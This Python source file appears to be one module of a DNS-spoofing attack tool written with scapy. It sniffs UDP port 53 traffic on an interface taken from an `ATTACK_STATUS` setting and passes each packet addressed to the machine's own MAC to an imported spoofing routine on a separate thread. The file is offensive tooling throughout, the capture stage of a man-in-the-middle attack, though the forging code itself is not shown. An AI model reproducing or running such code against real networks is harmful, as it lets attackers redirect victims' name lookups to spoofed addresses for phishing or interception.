from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys
import os
import ipaddress
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
from dns_spoofer import *

def launch_dns_spoofer(pkt, self_mac):

    if(pkt[Ether].dst == self_mac):
        # Démarrage d'un thread pour dns_spoofer avec pkt
        thread = threading.Thread(target=dns_sorting_start, args=(pkt,))
        thread.start()

def dns_sniffer():
    iface = str(ATTACK_STATUS['iface'])
    self_mac = get_if_hwaddr(iface)
    print("Starting DNS sniffer")
    sniff(filter="udp port 53", prn= lambda pkt : launch_dns_spoofer(pkt, self_mac), iface=iface)